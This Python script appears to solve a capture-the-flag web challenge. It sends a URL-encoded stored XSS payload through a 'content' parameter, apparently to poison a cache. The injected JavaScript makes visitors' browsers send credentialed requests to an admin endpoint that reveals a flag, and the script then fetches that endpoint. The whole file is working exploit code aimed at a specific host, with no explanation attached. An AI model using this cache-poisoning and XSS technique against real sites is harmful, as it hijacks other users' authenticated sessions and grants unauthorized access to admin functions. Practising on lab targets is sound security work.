#!/usr/bin/python3


import
requests
from time import sleep
from pprint import pprint
from urllib.parse import (
    quote,
    unquote
)

def main():

    print(requests.get(url="http://209.97.185.157:31891/index.php?language=en").headers)

    main_url = "http://209.97.185.157:31891/index.php%3Fcontent%3D%22%3E%3Cscript%3Evar%20xhr%20%3D%20new%20XMLHttpRequest%28%29%3Bxhr.open%28%27GET%27%2C%20%27http%3A//209.97.185.157%3A31891/admin.php%3Freveal_flag%3D1%27%2C%20true%29%3Bxhr.withCredentials%20%3D%20true%3Bxhr.send%28%29%3B%3C/script%3E%26language%3Dde"
    ress = requests.get(url=main_url)
    pprint(ress.headers)
    
    # print(ress.headers["X-Cache-Status"])

    sleep(5)

    print(requests.get(url="http://209.97.185.157:31891/admin.php?reveal_flag=1").text)
    # sleep(45)

    """
    this is the format of the cache url to get the flag: 'http%3A//209.97.185.157%3A31891/index.php%3Fcontent%3D%22%3E%3Cscript%3Evar%20xhr%20%3D%20new%20XMLHttpRequest%28%29%3Bxhr.open%28%27GET%27%2C%20%27http%3A//209.97.185.157%3A31891/admin.php%3Freveal_flag%3D1%27%2C%20true%29%3Bxhr.withCredentials%20%3D%20true%3Bxhr.send%28%29%3B%3C/script%3E%26language%3Dde'
    """
    
    """new_ress = requests.get(url="http://209.97.185.157:31657/admin.php?reveal_flag=1")
    new_ress2 = requests.get(url="http://209.97.185.157:31657/admin.php")
    
    if "Unauthorized!" not in new_ress.text or "Unauthorized!" not in new_ress2.text:
        print(new_ress.text)
        print(new_ress2.text)
    """

if __name__ == "__main__":
    main()
